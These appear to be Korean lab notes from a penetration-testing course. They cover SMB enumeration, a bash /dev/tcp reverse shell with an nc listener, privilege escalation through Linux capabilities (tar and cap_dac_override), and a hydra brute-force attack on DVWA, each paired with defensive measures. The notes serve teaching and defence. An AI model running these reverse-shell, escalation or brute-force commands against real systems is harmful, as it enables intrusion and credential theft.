# 2026-09-21 · enum4linux · 리버스 셸 · getcap/setcap 권한상승 · DVWA Brute Force

> 원본: [original/Notes_260921_124545.pdf](original/Notes_260921_124545.pdf)
>
> ⚠️ 교육용 취약 실습 머신/DVWA 대상 기록. 방어 관점과 함께 정리한다. 실제 시스템 대상 사용 금지.

## 1. 참고 도구
- **www.dcode.fr**: 각종 인코딩·암호 변환(디코딩) 관련 사이트.

## 2. SMB 열거 — enum4linux
```bash
sudo enum4linux 192.168.16.21    # Samba 호스트의 사용자/공유 정보 수집
```
- User ID 파악 → 비밀번호는 별도로 확보(크래킹 등).
- **miniserv**(웹민 등)에 대한 정보도 확인.
- 방어: SMB 익명 접근 차단, 불필요한 공유 제거, 최신 패치.

## 3. 리버스 셸
```bash
# 공격자(Kali)에서 리스너
sudo nc -lvnp 5555               # tcp 5555 포트 listening

# 대상에서 연결 (대상이 공격자로 접속해 셸을 넘김)
bash -i >& /dev/tcp/192.168.16.11/5555 0>&1
```

## 4. 권한 상승 — getcap / setcap (Linux Capabilities)
```bash
getcap -r / 2>/dev/null          # 시스템 전체에서 특수 권한(capability) 가진 파일 탐색
```
### tar capability 악용 예
```bash
cat /var/backups/.old_pass.bak   # 권한 없음 → Permission denied
# 특정 사용자가 쓸 수 있는 tar로 백업을 압축/해제해 파일 획득
./tar -cvf backups_old /var/backups/.old_pass.bak   # cyber 사용자가 사용 가능한 tar
./tar -xvf backups_old           # 다시 압축 해제
cat /var/backups/.old_pass.bak   # 접근 가능 → 소유가 root→cyber로 변경됨
```
### setcap으로 특수 권한 부여
```bash
sudo setcap cap_dac_override=+ep ./upper.py
       └ 원하는 capability(파일접근 무시) ┘ └ 설정 목표 파일 ┘
```
- `cap_dac_override`는 파일 권한 검사를 우회하게 하는 강력한 capability → 악용 시 권한 상승.
- 방어: `getcap -r /`로 주기 점검, 불필요한 capability 제거, SUID/capability 최소화.

## 5. DVWA — Brute Force (무차별 대입)
```bash
sudo hydra -l admin -P pass.txt 192.168.16.58 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=<쿠키값>; security=low:F=<실패시 나오는 문구>"
```
- `-l` 단일 사용자 / `-P` 패스워드 사전, `^USER^`·`^PASS^`가 대입 자리.
- `H=Cookie:` 세션 쿠키 지정, `F=` 실패 판별 문자열.
- **Proxy + Burp Suite**로 요청을 가로채 파라미터·쿠키를 파악한 뒤 구성.
- 방어: 계정 잠금(Account Lockout), CAPTCHA, rate limit, 2FA.

## 6. 정정·보충
- 리버스 셸 `bash -i >& /dev/tcp/IP/PORT 0>&1`은 bash의 `/dev/tcp` 기능을 이용 — 방화벽 아웃바운드 제한으로 완화 가능.
- Linux capability는 "루트 권한을 잘게 쪼갠 것" — SUID 대체 수단이지만 과하게 주면 그 자체가 권한상승 경로.
- hydra의 `H=`는 헤더, `C=`는 쿠키 전용 옵션으로도 지정 가능.

## 7. 복습 질문
1. enum4linux는 어떤 프로토콜의 무엇을 열거하나?
2. `cap_dac_override`가 위험한 이유는?
3. DVWA Brute Force에서 `F=`(실패 문자열)를 지정하는 이유는?
4. 리버스 셸의 아웃바운드 연결을 막으려면 어디서 통제하나?
